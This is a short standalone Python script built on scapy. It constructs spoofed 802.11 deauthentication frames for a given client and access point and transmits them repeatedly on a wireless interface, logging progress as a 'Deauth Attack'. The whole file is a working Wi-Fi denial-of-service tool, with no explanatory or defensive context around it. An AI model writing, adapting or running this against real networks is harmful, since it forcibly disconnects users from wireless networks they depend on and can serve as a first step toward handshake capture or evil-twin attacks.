#!/usr/bin/env python3
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def construct_deauth_packets(cli, ap):
    # De-authentication Packet For Access Point
    deauthAP = RadioTap() / Dot11(addr1=cli, addr2=ap, addr3=ap) / Dot11Deauth()
    # De-authentication Packet For Client
    deauthClient = RadioTap() / Dot11(addr1=ap, addr2=cli, addr3=cli) / Dot11Deauth()
    return deauthAP, deauthClient

def deauth(count, iface, cli, ap):
    print('[+] Constructing De-Authentication Packets...')
    deauthAP, deauthClient = construct_deauth_packets(cli, ap)

    print('[+] Starting Transmission of De-Authentication packets to AP:{} and CLIENT:{}'.format(ap, cli))

    try:
        for round in range(count):
            print('[+] Starting Round {}'.format(round + 1))
            for pkt in range(50):
                ##############################
                from time import sleep
                sleep(0.1)
                ##############################
                sendp(deauthAP, iface=iface, verbose=False)
                sendp(deauthClient, iface=iface, verbose=False)
                ##############################
                print('[+] Sent {} De-Authentication Packets'.format(pkt + 1), end='\r', flush=True)
            print()

        print('##########################')
        print('[!] Deauth Attack Done!')
    except KeyboardInterrupt:
        print()
        print('[!] Deauth Attack Stopped By User!')
